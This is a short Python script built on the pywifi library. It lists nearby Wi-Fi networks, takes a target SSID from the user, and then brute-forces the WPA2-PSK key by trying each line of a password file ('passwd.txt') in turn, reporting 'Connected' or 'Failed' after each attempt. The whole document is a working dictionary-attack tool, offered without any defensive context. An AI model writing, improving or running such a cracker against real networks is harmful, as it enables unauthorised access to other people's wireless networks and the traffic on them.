import pywifi
import time
from pywifi import const

wifi = pywifi.PyWiFi()

iface = wifi.interfaces()[0]

iface.disconnect()
time.sleep(1)
assert iface.status() in\
    [const.IFACE_DISCONNECTED, const.IFACE_INACTIVE]

profile = pywifi.Profile()

iface.scan()

time.sleep(1)

results = iface.scan_results()

for data in results:
    print(data.ssid)

ssid = str(input("Enter to Ssid : "))

profile.ssid = str(ssid)
profile.auth = const.AUTH_ALG_OPEN
profile.akm.append(const.AKM_TYPE_WPA2PSK)
profile.cipher = const.CIPHER_TYPE_CCMP

f = open("passwd.txt","r")

for passwd in f:
    profile.key = str(passwd)
    print("Password : " + profile.key,sep="",flush=True)
    iface.remove_all_network_profiles()
    tmp_profile = iface.add_network_profile(profile)

    iface.connect(tmp_profile)
    time.sleep(10)

    if iface.status() in [const.IFACE_CONNECTED]:
        print("Connected \n")

    else:
        print("Failed")





